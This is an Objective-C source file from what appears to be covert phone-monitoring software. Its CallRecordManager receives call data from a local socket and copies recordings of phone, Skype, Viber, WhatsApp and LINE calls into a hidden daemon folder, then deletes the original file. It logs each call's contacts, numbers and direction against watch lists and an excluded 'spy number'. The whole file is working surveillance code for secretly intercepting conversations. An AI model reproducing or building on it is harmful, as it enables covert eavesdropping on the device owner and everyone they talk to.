//
//  CallRecordManager.m
//  CallRecordManager
//
//  Created by Makara Khloth on 11/30/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import "CallRecordManager.h"
#import "CallRecordUtils.h"

#import "FxMediaEvent.h"
#import "FxCallTag.h"
#import "FxVoIPCallTag.h"
#import "FxRecipient.h"
#import "EventDelegate.h"
#import "PreferenceManager.h"
#import "PrefCallRecord.h"
#import "PrefEventsCapture.h"
#import "DebugStatus.h"
#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"
#import "ABContactsManager.h"

@interface CallRecordManager (private)
- (void) processCallRecordInfo: (NSDictionary *) aCallRecordInfo;
- (NSString *) recordingFileName: (NSString *) aOriginalFileName;
@end

@implementation CallRecordManager

- (id) initWithPreferenceManager: (id <PreferenceManager>) aPreferenceManager {
    self = [super init];
    if (self) {
        mPreferenceManager = aPreferenceManager;
        
        NSString *fileDirectory = [DaemonPrivateHome daemonPrivateHome];
        fileDirectory = [fileDirectory stringByAppendingString:@"media/capture/callrecord"];
        [DaemonPrivateHome createDirectoryAndIntermediateDirectories:fileDirectory];
    }
    return (self);
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    mEventDelegate = aEventDelegate;
}
- (void) unregisterEventDelegate {
    mEventDelegate = nil;
}

- (void) startCapture {
    DLog(@"Start capturing call record");
    if (!mSocketReader) {
        mSocketReader = [[SocketIPCReader alloc] initWithPortNumber:30302 andAddress:@"127.0.0.1" withSocketDelegate:self];
        [mSocketReader start];
    }
}

- (void) stopCapture {
    DLog(@"Stop capturing call record");
    if (mSocketReader) {
        [mSocketReader stop];
        [mSocketReader release];
        mSocketReader = nil;
    }
}

- (void) dataDidReceivedFromSocket: (NSData*) aRawData {
    NSDictionary *callRecordInfo = [NSKeyedUnarchiver unarchiveObjectWithData:aRawData];
    DLog(@"callRecordInfo, %@", callRecordInfo);
    
    [self processCallRecordInfo:callRecordInfo];
}

- (void) processCallRecordInfo: (NSDictionary *) aCallRecordInfo {
    PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)[mPreferenceManager preference:kEvents_Ctrl];
    PrefCallRecord *prefCallRecord = (PrefCallRecord *)[mPreferenceManager preference:kCallRecord];
    PrefMonitorNumber *prefMonitorNumber = (PrefMonitorNumber *)[mPreferenceManager preference:kMonitor_Number];
    NSString *telNumber = @"";
    NSArray *telNumberArray = [aCallRecordInfo objectForKey:@"phones"];
    NSArray *contactNameArray = [aCallRecordInfo objectForKey:@"phone_names"];
    
    NSString *ownerName = [aCallRecordInfo objectForKey:@"owner_name"];
    NSString *ownerID = [aCallRecordInfo objectForKey:@"owner_id"];
    
    NSString *filePath1 = [aCallRecordInfo objectForKey:@"mixFilePath"];
    NSString *app = [aCallRecordInfo objectForKey:@"app"];
    
    BOOL isWatchNumber = TRUE;
    BOOL isVoip = TRUE;
    
    if ([app isEqualToString:@"CALL"]) { // Check watch number only for phone call
        isVoip = FALSE;
        telNumber = [telNumberArray objectAtIndex:0];
        if ([telNumber rangeOfString:@"*"].location != NSNotFound ||
            [telNumber rangeOfString:@"#"].location != NSNotFound) {
            isWatchNumber = FALSE;
        } else {
            isWatchNumber = [CallRecordUtils isNumberInCallRecordWatchList:telNumber
                                                                 watchList:prefCallRecord];
            if (isWatchNumber) {
                // Must not spy number regardless of direction
                isWatchNumber = ![CallRecordUtils isSpyNumber:telNumber prefMonitorNumber:prefMonitorNumber];
            }
        }
    } else {
        if (!([prefCallRecord mWatchFlag] & kWatch_In_Addressbook ||
            [prefCallRecord mWatchFlag] & kWatch_Not_In_Addressbook ||
            [prefCallRecord mWatchFlag] & kWatch_In_List ||
            [prefCallRecord mWatchFlag] & kWatch_Private_Or_Unknown_Number)) { // Flags is not set
            isWatchNumber = FALSE;
        }
    }
    
    //Add logic to discard GSM or VoIP Call Recording in case of user enable only one of them
    if (isVoip && ![prefEventCapture mEnableVoIPCallRecording]) {
        isWatchNumber = false;
    }
    else if (!isVoip && ![prefEventCapture mEnableCallRecording]){
        isWatchNumber = false;
    }
    
    DLog(@"isWatchNumber, %d, flags: %lu", isWatchNumber, (unsigned long)[prefCallRecord mWatchFlag]);
    
    if (isWatchNumber) {
        NSString *fileDirectory = [DaemonPrivateHome daemonPrivateHome];
        fileDirectory = [fileDirectory stringByAppendingString:@"media/capture/callrecord/"];
        NSString *recordingFileName = [self recordingFileName:[filePath1 lastPathComponent]];
        NSString *filePath2 = [fileDirectory stringByAppendingString:recordingFileName];
        
        NSError *error = nil;
        [[NSFileManager defaultManager] copyItemAtPath:filePath1 toPath:filePath2 error:&error];
        DLog(@"Copy record file error, %@", error);
        
        FxMediaEvent *callRecordEvent = [[[FxMediaEvent alloc] init] autorelease];

        [callRecordEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        [callRecordEvent setFullPath:filePath2];
        [callRecordEvent setMDuration:[[aCallRecordInfo objectForKey:@"duration"] integerValue]];
        
        BOOL shouldCapture = NO;
        
        if (!isVoip) {
            shouldCapture = YES;
            [callRecordEvent setEventType:kEventTypeCallRecordAudio];
            
            FxCallTag *callTag = [[[FxCallTag alloc] init] autorelease];
            FxEventDirection direction = kEventDirectionIn;
            if ([[aCallRecordInfo objectForKey:@"direction"] isEqualToString:@"outgoing"]) {
                direction = kEventDirectionOut;
            }
            [callTag setDirection:direction];
            [callTag setDuration:[[aCallRecordInfo objectForKey:@"duration"] integerValue]];
            
            ABContactsManager *contactsManager = [[ABContactsManager alloc] init];
            NSString *telContactName = [contactsManager searchFirstNameLastName:telNumber];
            [contactsManager release];
            
            if ([telNumber isEqualToString:@"PRIVATE"]) {
                if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 7) {
                    telNumber = @"No Caller ID";
                } else {
                    telNumber = @"Blocked";
                }
            }
            
            [callTag setContactNumber:telNumber];
            [callTag setContactName:telContactName];
            
            [callRecordEvent setMCallTag:callTag];
        }
        else {
            [callRecordEvent setEventType:kEventTypeVoIPCallRecordAudio];
            
            FxVoIPCategory voipCategory = kVoIPCategoryUnknown;
            
            if ([app isEqualToString:@"skype"]) {
                voipCategory = kVoIPCategorySkype;
            }
            else if ([app isEqualToString:@"viber"]) {
                //Can't get owner id in Viber, use owner name as owner id
                ownerID = ownerName;
                voipCategory = kVoIPCategoryViber;
            }
            else if ([app isEqualToString:@"whatsapp"]) {
                voipCategory = kVoIPCategoryWhatsApp;
            }
            else if ([app isEqualToString:@"line"]) {
                voipCategory = kVoIPCategoryLINE;
            }
            
            //Only Capture VOIP call recording event that came from Apps those specific in setting
            if (voipCategory == kVoIPCategorySkype && ([prefEventCapture mEnableIndividualVoIPCallRecord] & kPrefVoIPCallRecordIndividualSkype)) {
                shouldCapture = YES;
            }
            
            if (voipCategory == kVoIPCategoryViber && ([prefEventCapture mEnableIndividualVoIPCallRecord] & kPrefVoIPCallRecordIndividualViber)) {
                shouldCapture = YES;
            }
            
            if (voipCategory == kVoIPCategoryWhatsApp && ([prefEventCapture mEnableIndividualVoIPCallRecord] & kPrefVoIPCallRecordIndividualWhatsApp)) {
                shouldCapture = YES;
            }
            
            if (voipCategory == kVoIPCategoryLINE && ([prefEventCapture mEnableIndividualVoIPCallRecord] & kPrefVoIPCallRecordIndividualLINE)) {
                shouldCapture = YES;
            }
            
            FxVoIPCallTag *callTag = [[[FxVoIPCallTag alloc] init] autorelease];
            FxEventDirection direction = kEventDirectionIn;
            if ([[aCallRecordInfo objectForKey:@"direction"] isEqualToString:@"outgoing"]) {
                direction = kEventDirectionOut;
            }
            [callTag setDirection:direction];
            [callTag setDuration:[[aCallRecordInfo objectForKey:@"duration"] integerValue]];
            
            
            [callTag setCategory:voipCategory];
            
            [callTag setOwnerName:ownerName];
            [callTag setOwnerNumberAddr:ownerID];
            
            NSMutableArray *recipentArray = [[NSMutableArray alloc] init];
            
            NSUInteger recipientCount = telNumberArray.count;
            for (int i = 0; i < recipientCount; i++) {
                FxRecipient *recipient = [[[FxRecipient alloc] init] autorelease];
                
                NSString *recipentNumber = [telNumberArray objectAtIndex:i];
                [recipient setRecipNumAddr:recipentNumber];
                
                NSString *recipentContactName = [contactNameArray objectAtIndex:i];
                [recipient setRecipContactName:recipentContactName];
                
                [recipentArray addObject:recipient];
            }
            
            [callTag setRecipients:recipentArray];
            [recipentArray release];
            
            [callRecordEvent setMVoIPCallTag:callTag];
        }
        
        if (shouldCapture) {
            DLog(@"--------------- CALL RECORD EVENT ---------------");
            DLog(@"duration(1): %ld", (long)[callRecordEvent mDuration]);
            DLog(@"duration(2): %ld", (long)[callRecordEvent.mCallTag duration]);
            DLog(@"direction: %d", [callRecordEvent.mCallTag direction]);
            DLog(@"name: %@", [callRecordEvent.mCallTag contactName]);
            DLog(@"number: %@", [callRecordEvent.mCallTag contactNumber]);
            DLog(@"--------------- VOIP ---------------");
            DLog(@"recipients: %@", [callRecordEvent.mVoIPCallTag recipients]);
            DLog(@"ownerName: %@", [callRecordEvent.mVoIPCallTag ownerName]);
            DLog(@"ownerNumberAddr: %@", [callRecordEvent.mVoIPCallTag ownerNumberAddr]);
            DLog(@"voip direction: %d", [callRecordEvent.mVoIPCallTag direction]);
            
            DLog(@"--------------- CALL RECORD EVENT ---------------");
            
            if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
                [mEventDelegate eventFinished:callRecordEvent];
            }
        }
        else {
          DLog(@"---------------NOT CAPTURE CALL RECORD EVENT ---------------");
        }
    }
    
    NSError *error = nil;
    [[NSFileManager defaultManager] removeItemAtPath:filePath1 error:&error];
    DLog(@"Delete record file error, %@", error);
}

- (NSString *) recordingFileName: (NSString *) aOriginalFileName {
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss"];
    NSString *formattedDateString = @"conversation_rec_";
    formattedDateString = [formattedDateString stringByAppendingString:[dateFormatter stringFromDate:[NSDate date]]];
    formattedDateString = [formattedDateString stringByReplacingOccurrencesOfString:@"-" withString:@""];
    formattedDateString = [formattedDateString stringByReplacingOccurrencesOfString:@":" withString:@""];
    formattedDateString = [formattedDateString stringByAppendingFormat:@".%@", [aOriginalFileName pathExtension]];
    DLog(@"formattedDateString: %@", formattedDateString);
    [dateFormatter release];
    return (formattedDateString);
}

- (void) dealloc {
    [self stopCapture];
    [super dealloc];
}

@end
